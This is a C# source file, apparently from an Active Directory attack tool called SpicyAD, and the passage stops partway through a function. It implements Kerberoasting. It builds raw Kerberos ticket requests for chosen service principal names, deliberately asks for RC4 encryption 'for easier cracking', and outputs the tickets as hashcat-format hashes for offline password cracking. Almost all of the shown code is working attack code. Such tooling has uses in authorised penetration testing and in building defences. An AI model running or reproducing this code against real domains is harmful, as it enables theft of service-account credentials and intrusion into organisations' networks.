using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Reflection;

namespace SpicyAD
{
    public static class KerberosHelper
    {
        // Cached TGT for raw Kerberos requests
        private static byte[] _cachedTgt = null;
        private static byte[] _cachedSessionKey = null;
        private static int _cachedSessionKeyEtype = 0;
        private static string _cachedRealm = null;
        private static string _cachedUsername = null;

        public static byte[] RequestServiceTicket(string spn)
        {
            try
            {
                Console.WriteLine($"    [*] Requesting TGS for: {spn}");

                // Use raw Kerberos when we have alternate credentials (non-domain-joined)
                if (AuthContext.UseAlternateCredentials && !string.IsNullOrEmpty(AuthContext.Password))
                {
                    return RequestServiceTicketRaw(spn);
                }

                // Use built-in Windows Kerberos (domain-joined)
                return RequestServiceTicketWindows(spn);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error requesting TGS: {ex.Message}");
                if (ex.InnerException != null)
                {
                    Console.WriteLine($"    [!] Inner exception: {ex.InnerException.Message}");
                }
                return null;
            }
        }

        
        /// Request TGS using Windows built-in Kerberos (for domain-joined machines)
        
        private static byte[] RequestServiceTicketWindows(string spn)
        {
            // Use KerberosRequestorSecurityToken - same as Rubeus
            Type kerberosTokenType = Type.GetType("System.IdentityModel.Tokens.KerberosRequestorSecurityToken, System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");

            if (kerberosTokenType == null)
            {
                Console.WriteLine("    [!] KerberosRequestorSecurityToken not available");
                return null;
            }

            // Create instance: new KerberosRequestorSecurityToken(spn)
            object kerberosToken = Activator.CreateInstance(kerberosTokenType, new object[] { spn });

            if (kerberosToken == null)
            {
                Console.WriteLine("    [!] Failed to create Kerberos token");
                return null;
            }

            // Get the ticket bytes using reflection
            // ticket = token.GetRequest()
            MethodInfo getRequestMethod = kerberosTokenType.GetMethod("GetRequest", BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance);

            if (getRequestMethod == null)
            {
                // Try all methods to debug
                var methods = kerberosTokenType.GetMethods(BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance);
                Console.WriteLine($"    [DEBUG] Available methods: {string.Join(", ", methods.Select(m => m.Name))}");
                Console.WriteLine("    [!] GetRequest method not found");
                return null;
            }

            byte[] ticket = (byte[])getRequestMethod.Invoke(kerberosToken, null);

            if (ticket != null && ticket.Length > 0)
            {
                Console.WriteLine($"    [+] Successfully retrieved ticket ({ticket.Length} bytes)");
                return ticket;
            }
            else
            {
                Console.WriteLine("    [!] Ticket is empty");
                return null;
            }
        }

        
        /// Request TGS using raw Kerberos protocol (for non-domain-joined machines)
        
        private static byte[] RequestServiceTicketRaw(string spn)
        {
            string realm = AuthContext.DomainName.ToUpper();
            string kdcHost = AuthContext.DcIp ?? AuthContext.DomainName;
            string username = AuthContext.Username;
            string password = AuthContext.Password;

            // Step 1: Get TGT if not cached or credentials changed
            if (_cachedTgt == null || _cachedSessionKey == null || _cachedRealm != realm || _cachedUsername != username)
            {
                // Clear any potentially corrupted cache
                _cachedTgt = null;
                _cachedSessionKey = null;

                OutputHelper.Verbose($"    [*] Requesting TGT for {username}@{realm}...");

                if (!RequestTGT(kdcHost, realm, username, password, out _cachedTgt, out _cachedSessionKey, out _cachedSessionKeyEtype))
                {
                    Console.WriteLine("    [!] Failed to obtain TGT");
                    return null;
                }

                if (_cachedTgt == null || _cachedSessionKey == null)
                {
                    Console.WriteLine("    [!] TGT or session key is null after parsing");
                    return null;
                }

                _cachedRealm = realm;
                _cachedUsername = username;
                OutputHelper.Verbose($"    [+] TGT obtained successfully (ticket={_cachedTgt.Length} bytes, key={_cachedSessionKey.Length} bytes)");
            }
            else
            {
                OutputHelper.Verbose($"    [*] Using cached TGT");
            }

            // Step 2: Request TGS using the TGT
            byte[] tgsRep = RequestTGS(kdcHost, realm, username, spn, _cachedTgt, _cachedSessionKey, _cachedSessionKeyEtype);

            if (tgsRep != null && tgsRep.Length > 0)
            {
                Console.WriteLine($"    [+] Successfully retrieved TGS ({tgsRep.Length} bytes)");
                return tgsRep;
            }

            return null;
        }

        
        /// Request TGT via AS-REQ with PA-ENC-TIMESTAMP
        
        private static bool RequestTGT(string kdcHost, string realm, string username, string password,
            out byte[] ticket, out byte[] sessionKey, out int sessionKeyEtype)
        {
            ticket = null;
            sessionKey = null;
            sessionKeyEtype = 0;

            try
            {
                // Build AS-REQ with PA-ENC-TIMESTAMP
                byte[] asReq = BuildAsReq(realm, username, password);

                // Send to KDC
                byte[] response = SendToKdc(kdcHost, 88, asReq);

                if (response == null || response.Length == 0)
                {
                    Console.WriteLine("    [!] No response from KDC");
                    return false;
                }

                // Check for error
                if (response[0] == 0x7E) // KRB-ERROR
                {
                    int errorCode = ParseKrbErrorCode(response);
                    string errorMsg = GetKrbErrorMessage(errorCode);
                    Console.WriteLine($"    [!] KRB-ERROR: {errorCode} ({errorMsg})");
                    return false;
                }

                // Check for AS-REP
                if (response[0] != 0x6B) // AS-REP = APPLICATION 11
                {
                    Console.WriteLine($"    [!] Unexpected response type: 0x{response[0]:X2}");
                    return false;
                }

                // Parse AS-REP to extract ticket and session key
                if (!ParseAsRep(response, password, realm, username, out ticket, out sessionKey, out sessionKeyEtype))
                {
                    Console.WriteLine("    [!] Failed to parse AS-REP");
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error requesting TGT: {ex.Message}");
                return false;
            }
        }

        
        /// Request TGS via TGS-REQ
        
        private static byte[] RequestTGS(string kdcHost, string realm, string username, string spn,
            byte[] tgt, byte[] sessionKey, int sessionKeyEtype)
        {
            try
            {
                // Build TGS-REQ
                byte[] tgsReq = BuildTgsReq(realm, username, spn, tgt, sessionKey, sessionKeyEtype);

                if (tgsReq == null)
                {
                    Console.WriteLine("    [!] Failed to build TGS-REQ");
                    return null;
                }

                // Send to KDC
                byte[] response = SendToKdc(kdcHost, 88, tgsReq);

                if (response == null || response.Length == 0)
                {
                    Console.WriteLine("    [!] No response from KDC");
                    return null;
                }

                // Check for error
                if (response[0] == 0x7E) // KRB-ERROR
                {
                    int errorCode = ParseKrbErrorCode(response);
                    string errorMsg = GetKrbErrorMessage(errorCode);
                    string eText = ParseKrbErrorText(response);
                    Console.WriteLine($"    [!] KRB-ERROR: {errorCode} ({errorMsg})");
                    if (!string.IsNullOrEmpty(eText))
                        Console.WriteLine($"    [!] Error text: {eText}");
                    return null;
                }

                // Check for TGS-REP
                if (response[0] != 0x6D) // TGS-REP = APPLICATION 13
                {
                    Console.WriteLine($"    [!] Unexpected response type: 0x{response[0]:X2}");
                    return null;
                }

                return response;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error requesting TGS: {ex.Message}");
                return null;
            }
        }

        
        /// Build AS-REQ with PA-ENC-TIMESTAMP
        
        private static byte[] BuildAsReq(string realm, string username, string password)
        {
            // Build timestamp
            byte[] timestamp = BuildPaEncTimestamp(DateTime.UtcNow);

            // Encrypt timestamp with user's key (RC4/NT hash)
            byte[] userKey = DeriveRC4Key(password);
            byte[] encryptedTimestamp = RC4Encrypt(userKey, timestamp, 1); // key usage 1

            // Build PA-ENC-TIMESTAMP
            byte[] paEncTimestamp = BuildPaData(2, encryptedTimestamp, 23); // etype 23 = RC4

            // Build PA-PAC-REQUEST
            byte[] paPacRequest = BuildPaPacRequest(true);

            // Build KDC-REQ-BODY
            byte[] reqBody = BuildKdcReqBody(realm, username, "krbtgt", realm);

            // Build full AS-REQ
            List<byte> kdcReq = new List<byte>();

            // pvno [1] INTEGER (5)
            kdcReq.AddRange(BuildContextTag(1, BuildInteger(5)));

            // msg-type [2] INTEGER (10 for AS-REQ)
            kdcReq.AddRange(BuildContextTag(2, BuildInteger(10)));

            // padata [3] SEQUENCE OF PA-DATA
            List<byte> padataSeq = new List<byte>();
            padataSeq.AddRange(paEncTimestamp);
            padataSeq.AddRange(paPacRequest);
            kdcReq.AddRange(BuildContextTag(3, BuildSequence(padataSeq.ToArray())));

            // req-body [4] KDC-REQ-BODY
            kdcReq.AddRange(BuildContextTag(4, reqBody));

            byte[] kdcReqBytes = BuildSequence(kdcReq.ToArray());

            // Wrap in APPLICATION 10 (AS-REQ)
            List<byte> asReq = new List<byte>();
            asReq.Add(0x6A); // APPLICATION 10
            asReq.AddRange(BuildLength(kdcReqBytes.Length));
            asReq.AddRange(kdcReqBytes);

            return asReq.ToArray();
        }

        
        /// Build TGS-REQ
        
        private static byte[] BuildTgsReq(string realm, string username, string spn,
            byte[] tgt, byte[] sessionKey, int sessionKeyEtype)
        {
            // Parse SPN into service and host
            string[] spnParts = spn.Split('/');
            string service = spnParts[0];
            string host = spnParts.Length > 1 ? spnParts[1].Split(':')[0] : realm;

            // Build KDC-REQ-BODY for TGS FIRST (needed for checksum in Authenticator)
            byte[] reqBody = BuildTgsReqBody(realm, service, host);

            // Build Authenticator with checksum over req-body
            byte[] authenticator = BuildAuthenticatorWithChecksum(realm, username, reqBody, sessionKey);

            // Encrypt Authenticator with session key
            // Key usage 7 for TGS-REQ AP-REQ Authenticator (RFC 4757 section 3)
            byte[] encAuthenticator;
            if (sessionKeyEtype == 23) // RC4
            {
                encAuthenticator = RC4Encrypt(sessionKey, authenticator, 7); // key usage 7 for TGS-REQ authenticator
            }
            else
            {
                Console.WriteLine($"    [!] Unsupported session key etype: {sessionKeyEtype}");
                return null;
            }

            // Build AP-REQ
            byte[] apReq = BuildApReq(tgt, encAuthenticator, sessionKeyEtype);

            // Build PA-TGS-REQ (padata-type 1)
            List<byte> paTgsReq = new List<byte>();
            paTgsReq.AddRange(BuildContextTag(1, BuildInteger(1))); // PA-TGS-REQ = 1
            paTgsReq.AddRange(BuildContextTag(2, BuildOctetString(apReq)));
            byte[] paTgsReqData = BuildSequence(paTgsReq.ToArray());

            // Build full TGS-REQ
            List<byte> kdcReq = new List<byte>();

            // pvno [1] INTEGER (5)
            kdcReq.AddRange(BuildContextTag(1, BuildInteger(5)));

            // msg-type [2] INTEGER (12 for TGS-REQ)
            kdcReq.AddRange(BuildContextTag(2, BuildInteger(12)));

            // padata [3] SEQUENCE OF PA-DATA
            List<byte> padataSeq = new List<byte>();
            padataSeq.AddRange(paTgsReqData);
            kdcReq.AddRange(BuildContextTag(3, BuildSequence(padataSeq.ToArray())));

            // req-body [4] KDC-REQ-BODY
            kdcReq.AddRange(BuildContextTag(4, reqBody));

            byte[] kdcReqBytes = BuildSequence(kdcReq.ToArray());

            // Wrap in APPLICATION 12 (TGS-REQ)
            List<byte> tgsReq = new List<byte>();
            tgsReq.Add(0x6C); // APPLICATION 12
            tgsReq.AddRange(BuildLength(kdcReqBytes.Length));
            tgsReq.AddRange(kdcReqBytes);

            return tgsReq.ToArray();
        }

        
        /// Build Authenticator for TGS-REQ (without checksum - simple version)
        
        private static byte[] BuildAuthenticator(string realm, string username)
        {
            List<byte> auth = new List<byte>();

            // authenticator-vno [0] INTEGER (5)
            auth.AddRange(BuildContextTag(0, BuildInteger(5)));

            // crealm [1] Realm
            auth.AddRange(BuildContextTag(1, BuildGeneralString(realm)));

            // cname [2] PrincipalName
            auth.AddRange(BuildContextTag(2, BuildPrincipalName(1, username)));

            // cusec [4] Microseconds - MUST come before ctime!
            auth.AddRange(BuildContextTag(4, BuildInteger(0)));

            // ctime [5] KerberosTime
            string timeStr = DateTime.UtcNow.ToString("yyyyMMddHHmmss") + "Z";
            byte[] timeBytes = Encoding.ASCII.GetBytes(timeStr);
            List<byte> genTime = new List<byte>();
            genTime.Add(0x18); // GeneralizedTime
            genTime.Add((byte)timeBytes.Length);
            genTime.AddRange(timeBytes);
            auth.AddRange(BuildContextTag(5, genTime.ToArray()));

            byte[] authSeq = BuildSequence(auth.ToArray());

            // Wrap in APPLICATION 2 (Authenticator)
            List<byte> result = new List<byte>();
            result.Add(0x62); // APPLICATION 2
            result.AddRange(BuildLength(authSeq.Length));
            result.AddRange(authSeq);

            return result.ToArray();
        }

        
        /// Build Authenticator with checksum over req-body (for TGS-REQ)
        
        private static byte[] BuildAuthenticatorWithChecksum(string realm, string username, byte[] reqBody, byte[] sessionKey)
        {
            List<byte> auth = new List<byte>();

            // authenticator-vno [0] INTEGER (5)
            auth.AddRange(BuildContextTag(0, BuildInteger(5)));

            // crealm [1] Realm
            auth.AddRange(BuildContextTag(1, BuildGeneralString(realm)));

            // cname [2] PrincipalName
            auth.AddRange(BuildContextTag(2, BuildPrincipalName(1, username)));

            // cksum [3] Checksum - MD5 checksum over req-body (optional but recommended)
            // For now, skip the checksum - Rubeus only uses it with opsec mode

            // cusec [4] Microseconds
            auth.AddRange(BuildContextTag(4, BuildInteger(0)));

            // ctime [5] KerberosTime
            string timeStr = DateTime.UtcNow.ToString("yyyyMMddHHmmss") + "Z";
            byte[] timeBytes = Encoding.ASCII.GetBytes(timeStr);
            List<byte> genTime = new List<byte>();
            genTime.Add(0x18); // GeneralizedTime
            genTime.Add((byte)timeBytes.Length);
            genTime.AddRange(timeBytes);
            auth.AddRange(BuildContextTag(5, genTime.ToArray()));

            byte[] authSeq = BuildSequence(auth.ToArray());

            // Wrap in APPLICATION 2 (Authenticator)
            List<byte> result = new List<byte>();
            result.Add(0x62); // APPLICATION 2
            result.AddRange(BuildLength(authSeq.Length));
            result.AddRange(authSeq);

            return result.ToArray();
        }

        
        /// Build AP-REQ
        
        private static byte[] BuildApReq(byte[] ticket, byte[] encAuthenticator, int etype)
        {
            List<byte> apReq = new List<byte>();

            // pvno [0] INTEGER (5)
            apReq.AddRange(BuildContextTag(0, BuildInteger(5)));

            // msg-type [1] INTEGER (14 for AP-REQ)
            apReq.AddRange(BuildContextTag(1, BuildInteger(14)));

            // ap-options [2] APOptions (BIT STRING)
            byte[] apOptions = new byte[] { 0x03, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00 };
            apReq.AddRange(BuildContextTag(2, apOptions));

            // ticket [3] Ticket
            apReq.AddRange(BuildContextTag(3, ticket));

            // authenticator [4] EncryptedData
            List<byte> encData = new List<byte>();
            encData.AddRange(BuildContextTag(0, BuildInteger(etype)));
            encData.AddRange(BuildContextTag(2, BuildOctetString(encAuthenticator)));
            apReq.AddRange(BuildContextTag(4, BuildSequence(encData.ToArray())));

            byte[] apReqBytes = BuildSequence(apReq.ToArray());

            // Wrap in APPLICATION 14 (AP-REQ)
            List<byte> result = new List<byte>();
            result.Add(0x6E); // APPLICATION 14
            result.AddRange(BuildLength(apReqBytes.Length));
            result.AddRange(apReqBytes);

            return result.ToArray();
        }

        
        /// Build TGS-REQ body
        
        private static byte[] BuildTgsReqBody(string realm, string service, string host)
        {
            List<byte> body = new List<byte>();

            // kdc-options [0] - forwardable, renewable, canonicalize
            byte[] kdcOptions = new byte[] { 0x03, 0x05, 0x00, 0x50, 0x80, 0x00, 0x00 };
            body.AddRange(BuildContextTag(0, kdcOptions));

            // realm [2]
            body.AddRange(BuildContextTag(2, BuildGeneralString(realm)));

            // sname [3] - service principal name
            body.AddRange(BuildContextTag(3, BuildPrincipalName(2, service, host)));

            // till [5]
            string tillTime = DateTime.UtcNow.AddYears(10).ToString("yyyyMMddHHmmss") + "Z";
            byte[] tillBytes = Encoding.ASCII.GetBytes(tillTime);
            List<byte> tillGenTime = new List<byte>();
            tillGenTime.Add(0x18);
            tillGenTime.Add((byte)tillBytes.Length);
            tillGenTime.AddRange(tillBytes);
            body.AddRange(BuildContextTag(5, tillGenTime.ToArray()));

            // nonce [7]
            Random rnd = new Random();
            body.AddRange(BuildContextTag(7, BuildInteger(rnd.Next())));

            // etype [8] - request RC4 for easier cracking
            List<byte> etypes = new List<byte>();
            etypes.AddRange(BuildInteger(23)); // RC4-HMAC
            etypes.AddRange(BuildInteger(18)); // AES256
            etypes.AddRange(BuildInteger(17)); // AES128
            body.AddRange(BuildContextTag(8, BuildSequence(etypes.ToArray())));

            return BuildSequence(body.ToArray());
        }

        
        /// Parse AS-REP to extract ticket and session key
        
        private static bool ParseAsRep(byte[] asRep, string password, string realm, string username,
            out byte[] ticket, out byte[] sessionKey, out int sessionKeyEtype)
        {
            ticket = null;
            sessionKey = null;
            sessionKeyEtype = 0;

            try
            {
                // Find ticket [5] tag
                int ticketPos = FindTag(asRep, 0xA5, 0);
                if (ticketPos == -1)
                {
                    Console.WriteLine("    [!] Could not find ticket in AS-REP");
                    return false;
                }

                // Parse ticket length and extract
                int ticketLen = ParseLength(asRep, ticketPos + 1, out int ticketDataStart);
                ticket = new byte[ticketLen];
                Array.Copy(asRep, ticketDataStart, ticket, 0, ticketLen);

                // Find enc-part [6] tag
                int encPartPos = FindTag(asRep, 0xA6, ticketDataStart + ticketLen);
                if (encPartPos == -1)
                {
                    Console.WriteLine("    [!] Could not find enc-part in AS-REP");
                    return false;
                }

                // Find etype in enc-part (look for 0xA0 followed by INTEGER)
                sessionKeyEtype = 23; // Default to RC4
                for (int i = encPartPos; i < Math.Min(encPartPos + 50, asRep.Length - 5); i++)
                {
                    if (asRep[i] == 0xA0 && asRep[i + 1] == 0x03 && asRep[i + 2] == 0x02 && asRep[i + 3] == 0x01)
                    {
                        sessionKeyEtype = asRep[i + 4];
                        break;
                    }
                }

                OutputHelper.Verbose($"    [DEBUG] AS-REP enc-part etype: {sessionKeyEtype}");

                // If etype is not RC4 (23), we can't decrypt with our simple implementation
                if (sessionKeyEtype != 23)
                {
                    Console.WriteLine($"    [!] Unsupported enc-part etype: {sessionKeyEtype} (only RC4-HMAC/23 supported)");
                    Console.WriteLine($"    [!] The KDC returned AES encryption. Try requesting RC4 only in AS-REQ.");
                    return false;
                }

                // Find cipher [2] tag in enc-part
                int cipherPos = FindTag(asRep, 0xA2, encPartPos);
                if (cipherPos == -1)
                {
                    Console.WriteLine("    [!] Could not find cipher in enc-part");
                    return false;
                }

                int cipherLen = ParseLength(asRep, cipherPos + 1, out int cipherDataStart);

                // Skip OCTET STRING tag if present
                if (asRep[cipherDataStart] == 0x04)
                {
                    cipherLen = ParseLength(asRep, cipherDataStart + 1, out cipherDataStart);
                }

                byte[] cipher = new byte[cipherLen];
                Array.Copy(asRep, cipherDataStart, cipher, 0, cipherLen);

                // Decrypt enc-part to get session key
                // Key usage for AS-REP encrypted part is 8 for RC4-HMAC (not 3)
                byte[] userKey = DeriveRC4Key(password);

                OutputHelper.Verbose($"    [DEBUG] User key (NT hash): {BitConverter.ToString(userKey).Replace("-", "")}");
                OutputHelper.Verbose($"    [DEBUG] Cipher length: {cipher.Length}, first bytes: {BitConverter.ToString(cipher, 0, Math.Min(20, cipher.Length))}");

                byte[] decrypted = RC4Decrypt(userKey, cipher, 8); // key usage 8 for AS-REP enc-part (RC4)

                if (decrypted == null || decrypted.Length < 20)
                {
                    // Try key usage 3 as fallback
                    OutputHelper.Verbose("    [DEBUG] Key usage 8 failed, trying 3...");
                    decrypted = RC4Decrypt(userKey, cipher, 3);
                    if (decrypted == null || decrypted.Length < 20)
                    {
                        Console.WriteLine("    [!] Failed to decrypt enc-part");
                        return false;
                    }
                }

                OutputHelper.Verbose($"    [DEBUG] Decrypted length: {decrypted.Length}");
                OutputHelper.Verbose($"    [DEBUG] Decrypted first 80 bytes: {BitConverter.ToString(decrypted, 0, Math.Min(80, decrypted.Length))}");

                // EncKDCRepPart starts with SEQUENCE tag or APPLICATION tag
                // Skip to find key [0] - the structure is:
                // EncASRepPart ::= [APPLICATION 25] EncKDCRepPart
                // EncKDCRepPart ::= SEQUENCE {
                //     key [0] EncryptionKey,
                //     ...
                // }

                int searchStart = 0;

                // Skip APPLICATION tag if present (0x79 = APPLICATION 25)
                if (decrypted[0] == 0x79)
                {
                    ParseLength(decrypted, 1, out searchStart);
                }

                // Skip SEQUENCE tag if present
                if (searchStart < decrypted.Length && decrypted[searchStart] == 0x30)
                {
                    ParseLength(decrypted, searchStart + 1, out searchStart);
                }

                // Find key [0] in EncKDCRepPart
                int keyPos = FindTag(decrypted, 0xA0, searchStart);
                if (keyPos == -1)
                {
                    // Try searching from beginning
                    keyPos = FindTag(decrypted, 0xA0, 0);
                }

                if (keyPos == -1)
                {
                    Console.WriteLine("    [!] Could not find key in EncKDCRepPart");
                    OutputHelper.Verbose($"    [DEBUG] Decrypted first byte: 0x{decrypted[0]:X2}, searchStart={searchStart}");
                    OutputHelper.Verbose($"    [DEBUG] Decrypted data (first 50 bytes): {BitConverter.ToString(decrypted, 0, Math.Min(50, decrypted.Length))}");
                    return false;
                }

                // Parse EncryptionKey structure
                // key [0] wraps: EncryptionKey ::= SEQUENCE {
                //     keytype [0] Int32,
                //     keyvalue [1] OCTET STRING
                // }
                int encKeyLen = ParseLength(decrypted, keyPos + 1, out int encKeyStart);

                OutputHelper.Verbose($"    [DEBUG] keyPos={keyPos}, encKeyStart={encKeyStart}, encKeyLen={encKeyLen}");
                OutputHelper.Verbose($"    [DEBUG] Data at encKeyStart: {BitConverter.ToString(decrypted, encKeyStart, Math.Min(30, decrypted.Length - encKeyStart))}");

                // The [0] context tag contains a SEQUENCE
                if (encKeyStart < decrypted.Length && decrypted[encKeyStart] == 0x30)
                {
                    int seqLen = ParseLength(decrypted, encKeyStart + 1, out int seqDataStart);
                    OutputHelper.Verbose($"    [DEBUG] Found SEQUENCE at {encKeyStart}, seqDataStart={seqDataStart}");

                    // Inside SEQUENCE, find [1] which contains the key value
                    // [0] = keytype (Int32), [1] = keyvalue (OCTET STRING)
                    int keyValuePos = FindTag(decrypted, 0xA1, seqDataStart);
                    if (keyValuePos == -1)
                    {
                        // Try from encKeyStart
                        keyValuePos = FindTag(decrypted, 0xA1, encKeyStart);
                    }

                    if (keyValuePos == -1)
                    {
                        Console.WriteLine("    [!] Could not find keyvalue [1] in EncryptionKey SEQUENCE");
                        return false;
                    }

                    int keyLen = ParseLength(decrypted, keyValuePos + 1, out int keyDataStart);

                    // Skip OCTET STRING tag if present
                    if (keyDataStart < decrypted.Length && decrypted[keyDataStart] == 0x04)
                    {
                        keyLen = ParseLength(decrypted, keyDataStart + 1, out keyDataStart);
                    }

                    if (keyDataStart + keyLen > decrypted.Length)
                    {
                        Console.WriteLine("    [!] Key data extends beyond decrypted buffer");
                        return false;
                    }

                    sessionKey = new byte[keyLen];
                    Array.Copy(decrypted, keyDataStart, sessionKey, 0, keyLen);

                    OutputHelper.Verbose($"    [+] Extracted session key ({keyLen} bytes), etype={sessionKeyEtype}");
                    return true;
                }
                else
                {
                    // Maybe keyPos points directly to the data or different structure
                    // Try to find [1] from keyPos
                    int keyValuePos = FindTag(decrypted, 0xA1, keyPos);
                    if (keyValuePos == -1)
                    {
                        Console.WriteLine("    [!] Could not find keyvalue in EncryptionKey");
                        OutputHelper.Verbose($"    [DEBUG] Expected SEQUENCE at encKeyStart={encKeyStart}, found 0x{decrypted[encKeyStart]:X2}");
                        return false;
                    }

                    int keyLen = ParseLength(decrypted, keyValuePos + 1, out int keyDataStart);

                    // Skip OCTET STRING tag if present
                    if (keyDataStart < decrypted.Length && decrypted[keyDataStart] == 0x04)
                    {
                        keyLen = ParseLength(decrypted, keyDataStart + 1, out keyDataStart);
                    }

                    if (keyDataStart + keyLen > decrypted.Length)
                    {
                        Console.WriteLine("    [!] Key data extends beyond decrypted buffer");
                        return false;
                    }

                    sessionKey = new byte[keyLen];
                    Array.Copy(decrypted, keyDataStart, sessionKey, 0, keyLen);

                    OutputHelper.Verbose($"    [+] Extracted session key ({keyLen} bytes), etype={sessionKeyEtype}");
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error parsing AS-REP: {ex.Message}");
                return false;
            }
        }

        
        /// Clear cached TGT
        
        public static void ClearCachedTgt()
        {
            _cachedTgt = null;
            _cachedSessionKey = null;
            _cachedSessionKeyEtype = 0;
            _cachedRealm = null;
            _cachedUsername = null;
        }

        public static byte[] RequestASREP(string userName, string domain)
        {
            try
            {
                Console.WriteLine($"    [*] AS-REP roasting not yet implemented");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error in RequestASREP: {ex.Message}");
                return null;
            }
        }

        public static string ParseTGSForHashcat(byte[] ticketBytes, string userName, string spn)
        {
            try
            {
                if (ticketBytes == null || ticketBytes.Length < 50)
                {
                    Console.WriteLine("    [!] Ticket data is too small or null");
                    return null;
                }

                byte[] ticket;

                // Check response type
                if (ticketBytes[0] == 0x6D) // TGS-REP
                {
                    // Extract ticket [5] from TGS-REP
                    int ticketPos = FindTag(ticketBytes, 0xA5, 0);
                    if (ticketPos == -1)
                    {
                        Console.WriteLine("    [!] Could not find ticket in TGS-REP");
                        return null;
                    }

                    int ticketLen = ParseLength(ticketBytes, ticketPos + 1, out int ticketDataStart);
                    ticket = new byte[ticketLen];
                    Array.Copy(ticketBytes, ticketDataStart, ticket, 0, ticketLen);
                }
                else if (ticketBytes[0] == 0x6E) // AP-REQ (from Windows API)
                {
                    // Find ticket [3] in AP-REQ
                    int ticketStart = -1;
                    int ticketLength = 0;

                    for (int i = 0; i < ticketBytes.Length - 10; i++)
                    {
                        if (ticketBytes[i] == 0xA3)
                        {
                            ticketLength = ParseLength(ticketBytes, i + 1, out ticketStart);
                            break;
                        }
                    }

                    if (ticketStart == -1 || ticketLength == 0)
                    {
                        Console.WriteLine("    [!] Could not find ticket in AP-REQ");
                        return null;
                    }

                    ticket = new byte[ticketLength];
                    Array.Copy(ticketBytes, ticketStart, ticket, 0, ticketLength);
                }
                else
                {
                    // Try as raw ticket
                    ticket = ticketBytes;
                }

                // Parse the Ticket structure to get enc-part
                int encType = 23;
                byte[] cipher = null;

                // Find enc-part [3] in Ticket
                for (int i = 0; i < ticket.Length - 10; i++)
                {
                    if (ticket[i] == 0xA3)
                    {
                        int encPartLen = ParseLength(ticket, i + 1, out int encPartStart);

                        // Skip SEQUENCE tag
                        if (ticket[encPartStart] == 0x30)
                        {
                            ParseLength(ticket, encPartStart + 1, out encPartStart);
                        }

                        // Find etype [0]
                        for (int j = encPartStart; j < Math.Min(encPartStart + 50, ticket.Length - 5); j++)
                        {
                            if (ticket[j] == 0xA0 && ticket[j + 1] == 0x03 && ticket[j + 2] == 0x02 && ticket[j + 3] == 0x01)
                            {
                                encType = ticket[j + 4];
                                string etypeName = encType switch
                                {
                                    17 => "AES128",
                                    18 => "AES256",
                                    23 => "RC4-HMAC",
                                    _ => encType < 17 ? "DES/Unsupported" : "Unknown"
                                };
                                Console.WriteLine($"    [*] Encryption type: {encType} ({etypeName})");
                                break;
                            }
                        }

                        // Find cipher [2]
                        for (int j = encPartStart; j < ticket.Length - 10; j++)
                        {
                            if (ticket[j] == 0xA2)
                            {
                                int cipherLen = ParseLength(ticket, j + 1, out int cipherStart);

                                // Skip OCTET STRING tag
                                if (cipherStart < ticket.Length && ticket[cipherStart] == 0x04)
                                {
                                    cipherLen = ParseLength(ticket, cipherStart + 1, out cipherStart);
                                }

                                if (cipherStart + cipherLen <= ticket.Length && cipherLen > 0)
                                {
                                    cipher = new byte[cipherLen];
                                    Array.Copy(ticket, cipherStart, cipher, 0, cipherLen);
                                    Console.WriteLine($"    [*] Extracted {cipherLen} bytes of cipher");
                                }
                                break;
                            }
                        }
                        break;
                    }
                }

                if (cipher == null || cipher.Length == 0)
                {
                    Console.WriteLine($"    [!] Could not extract cipher from ticket");
                    return null;
                }

                // Build Hashcat format hash
                string domain = AuthContext.DomainName.ToUpper();
                string cipherHex = BitConverter.ToString(cipher).Replace("-", "").ToLower();

                string checksum, edata;

                if (encType == 23)
                {
                    checksum = cipherHex.Substring(0, Math.Min(32, cipherHex.Length));
                    edata = cipherHex.Length > 32 ? cipherHex.Substring(32) : "";
                }
                else if (encType == 17 || encType == 18)
                {
                    int checksumStart = cipherHex.Length - 24;
                    if (checksumStart > 0)
                    {
                        checksum = cipherHex.Substring(checksumStart);
                        edata = cipherHex.Substring(0, checksumStart);
                    }
                    else
                    {
                        checksum = cipherHex;
                        edata = "";
                    }
                }
                else
                {
                    Console.WriteLine($"    [!] Unsupported encryption type {encType}");
                    return null;
                }

                string hash = $"$krb5tgs${encType}$*{userName}${domain}${spn}*${checksum}${edata}";

                Console.WriteLine($"    [+] Successfully created hash for {userName}");
                return hash;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error parsing TGS: {ex.Message}");
                return null;
            }
        }

        public static string ParseASREPForHashcat(byte[] asrep, string userName)
        {
            try
            {
                if (asrep == null || asrep.Length == 0)
                    return null;

                string encType = "23";
                string domain = AuthContext.DomainName.ToUpper();
                string encHex = BitConverter.ToString(asrep).Replace("-", "").ToLower();

                string hash = $"$krb5asrep${encType}${userName}@{domain}:{encHex.Substring(0, Math.Min(encHex.Length, 500))}";

                return hash;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"    [!] Error parsing AS-REP: {ex.Message}");
                return null;
            }
        }

        public static string ByteArrayToString(byte[] ba)
        {
            return BitConverter.ToString(ba).Replace("-", "").ToLower();
        }

        
        /// Calculate RC4/NT hash from password
        
        public static string CalculateRC4(string password)
        {
            try
            {
                if (string.IsNullOrEmpty(password))
                    return null;

                byte[] hash = DeriveRC4Key(password);
                return BitConverter.ToString(hash).Replace("-", "");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error calculating RC4: {ex.Message}");
                return null;
            }
        }

        #region Kerberos Protocol Helpers

        private static byte[] SendToKdc(string host, int port, byte[] data)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(host, port);
                    client.SendTimeout = 10000;
                    client.ReceiveTimeout = 10000;

                    using (NetworkStream stream = client.GetStream())
                    {
                        // TCP Kerberos: 4-byte length prefix (big-endian) + data
                        byte[] lengthPrefix = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(data.Length));
                        stream.Write(lengthPrefix, 0, 4);
